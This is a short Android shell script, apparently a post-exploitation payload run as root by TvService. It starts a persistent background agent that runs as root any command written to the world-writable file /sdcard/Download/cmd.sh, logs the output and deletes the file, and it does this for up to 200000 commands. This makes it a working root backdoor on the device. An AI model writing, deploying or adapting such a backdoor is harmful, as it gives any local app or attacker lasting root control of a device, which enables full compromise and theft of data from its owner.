#!/system/bin/sh
# Executed once by TvService as uid 0; detaches a persistent root agent.
# From then on, writing a command into /sdcard/Download/cmd.sh makes the agent
# run it within one second and append the output to agent.log.
L=/sdcard/Download/agent.log
(
  echo "agent up pid=$$ uid=$(id -u) $(date)" >> $L
  n=0
  while [ $n -lt 200000 ]; do
    if [ -f /sdcard/Download/cmd.sh ]; then
      echo "=== run#$n $(date) ===" >> $L
      /system/bin/sh /sdcard/Download/cmd.sh >> $L 2>&1
      echo "=== done#$n rc=$? $(date) ===" >> $L
      rm -f /sdcard/Download/cmd.sh
      n=$((n+1))
    fi
    sleep 1
  done
  echo "agent exit $(date)" >> $L
) >/dev/null 2>&1 &
echo "agent detach pid=$!" > /sdcard/Download/agent.boot
chmod 666 /sdcard/Download/agent.boot 2>/dev/null
exit 0
